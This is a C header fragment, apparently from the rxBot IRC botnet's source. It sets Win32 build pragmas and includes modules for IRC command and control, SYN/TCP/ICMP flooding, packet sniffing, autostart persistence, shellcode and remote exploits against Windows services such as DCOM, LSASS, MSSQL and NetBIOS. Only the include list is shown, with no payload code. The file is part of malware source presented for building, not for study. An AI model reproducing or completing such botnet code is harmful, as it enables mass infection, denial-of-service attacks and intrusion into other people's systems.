#ifdef WIN32
#define _WIN32_WINNT	0x0403				// Very important for critical sections.
#define WIN32_LEAN_AND_MEAN					// Good to use.
#pragma optimize("gsy", on)					// Global optimization, Short sequences, Frame pointers.
#pragma comment(linker,"/RELEASE")			// Release code
#pragma comment(linker, "/ALIGN:4096")		// This will save you some size on the executable.
#pragma comment(linker, "/IGNORE:4108 ")	// This is only here for when you use /ALIGN:4096.
//#pragma pack(1)								// Force packing on byte boundaries.
#endif // WIN32

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <malloc.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windns.h>
#include <iphlpapi.h>
#include <lm.h>
#include <lmat.h>
#include <io.h>
#include <fcntl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <assert.h>
#include <sqlext.h>
#include <vfw.h>
#include <shlobj.h>
#include <ntsecapi.h>
#include "defines.h"
#include "ehandler.h"
#include "processes.h"
#include "loaddlls.h"
#include "tcpip.h"
#include "threads.h"
#include "rxbot.h"
#include "irc_send.h"
#include "crc32.h"
#include "random.h"
#include "netutils.h"
#include "sysinfo.h"
#include "advscan.h"
#include "ident.h"
#include "rndnick.h"
#include "download.h"
#include "scan.h"
#include "ddos.h"
#include "synflood.h"
#include "tcpflood.h"
#include "icmpflood.h"
#include "pingudp.h"
#include "redirect.h"
#include "wildcard.h"
#include "misc.h"
#include "driveinfo.h"
#include "visit.h"
#include "tftpd.h"
#include "aliaslog.h"
#include "psniff.h"
#include "net.h"
#include "secure.h"
#include "autostart.h"
#include "session.h"
#include "findfile.h"
#include "netbios.h"
#include "fphost.h"
#include "shellcode.h"
#include "dcom.h"
#include "lsass.h"
#include "mssql.h"
#include "ftpd.h"
#include "dcass.h"
#include "clsass.h"
#include "mssqllsass.h"
#include "ndcass.h"
#include "ntlsa.h"
#include "wkssvc.h"
#include "lsass1lsass.h"
#include "aim.h"
#include "ms04_007_asn1.h"
#include "sas.h"